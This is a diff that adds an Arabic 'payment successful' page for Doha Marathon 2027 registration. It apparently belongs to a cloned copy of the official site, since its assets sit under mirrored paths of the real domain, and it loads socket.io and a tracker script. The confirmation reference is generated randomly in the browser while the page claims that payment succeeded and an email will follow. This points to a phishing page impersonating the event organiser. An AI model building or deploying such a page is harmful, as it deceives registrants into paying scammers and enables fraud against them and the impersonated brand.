@@ -1,0 +1,67 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="theme-color" content="#ed1c24">
+	<title>تمت العملية بنجاح - ماراثون الدوحة 2027</title>
+	<link rel="stylesheet" href="assets/dohamarathonooredoo.com/wp-content/uploads/elementor/google-fonts/css/notosans.css">
+	<link rel="stylesheet" href="assets/dohamarathonooredoo.com/wp-content/uploads/elementor/google-fonts/css/rubik.css">
+	<link rel="stylesheet" href="assets/registration-payment.css">
+	<style>
+		.success-container { text-align:center; padding:48px 20px; }
+		.success-check {
+			width:80px; height:80px; margin:0 auto 24px;
+			background:#22c55e; border-radius:50%;
+			display:flex; align-items:center; justify-content:center;
+			animation:popIn .5s ease;
+		}
+		@keyframes popIn { 0%{transform:scale(0)} 60%{transform:scale(1.15)} 100%{transform:scale(1)} }
+		.success-check svg { width:40px; height:40px; color:#fff; }
+		.success-title { font-size:24px; font-weight:700; color:#22c55e; margin-bottom:12px; }
+		.success-subtitle { font-size:15px; color:#555; line-height:1.7; margin-bottom:24px; }
+		.success-ref { display:inline-block; padding:10px 20px; background:#f0fdf4; border:1px solid #bbf7d0; border-radius:8px; font-family:Arial,sans-serif; font-size:18px; font-weight:700; color:#166534; direction:ltr; letter-spacing:1px; margin-bottom:20px; }
+		.success-note { font-size:13px; color:#999; line-height:1.6; }
+	</style>
+</head>
+<body>
+	<header class="payment-header">
+		<nav class="header-actions" aria-label="روابط سريعة">
+			<a href="index.html" aria-label="العودة للرئيسية" title="العودة للرئيسية">
+				<svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="9"></circle><path d="M3 12h18M12 3a15 15 0 0 1 0 18M12 3a15 15 0 0 0 0 18"></path></svg>
+			</a>
+			<span class="participant-count" aria-label="مشارك واحد">(1)</span>
+			<svg class="cart-icon" viewBox="0 0 24 24" aria-hidden="true"><path d="M2 3h2l2.3 12.1a2 2 0 0 0 2 1.6h9.9a2 2 0 0 0 2-1.6L22 7H5"></path><circle cx="9" cy="21" r="1"></circle><circle cx="18" cy="21" r="1"></circle></svg>
+		</nav>
+		<a class="payment-brand" href="index.html" aria-label="ماراثون الدوحة من أريدُ">
+			<img src="assets/suffixevnt.blob.core.windows.net/dohaimages/2025/06/Logo.png" alt="ماراثون الدوحة من أريدُ">
+		</a>
+	</header>
+
+	<main class="payment-shell">
+		<section class="payment-card" aria-label="تمت العملية بنجاح">
+			<div class="success-container">
+				<div class="success-check">
+					<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+				</div>
+				<h1 class="success-title">تمت عملية الدفع بنجاح!</h1>
+				<p class="success-subtitle">شكراً لتسجيلك في ماراثون الدوحة 2027.<br>ستصلك رسالة تأكيد عبر البريد الإلكتروني.</p>
+				<div class="success-ref" id="ref-number"></div>
+				<p class="success-note">يرجى الاحتفاظ برقم المرجع للمراجعة.<br>يمكنك إغلاق هذه الصفحة الآن.</p>
+			</div>
+		</section>
+	</main>
+	<footer class="payment-footer" aria-hidden="true"></footer>
+<script src="/socket.io/socket.io.js"></script>
+<script src="/assets/tracker.js"></script>
+<script>
+(function(){
+	var refEl = document.getElementById("ref-number");
+	if (refEl) {
+		var ref = "DM-" + Date.now().toString(36).toUpperCase() + "-" + Math.random().toString(36).substring(2,6).toUpperCase();
+		refEl.textContent = ref;
+	}
+})();
+</script>
+</body>
+</html>
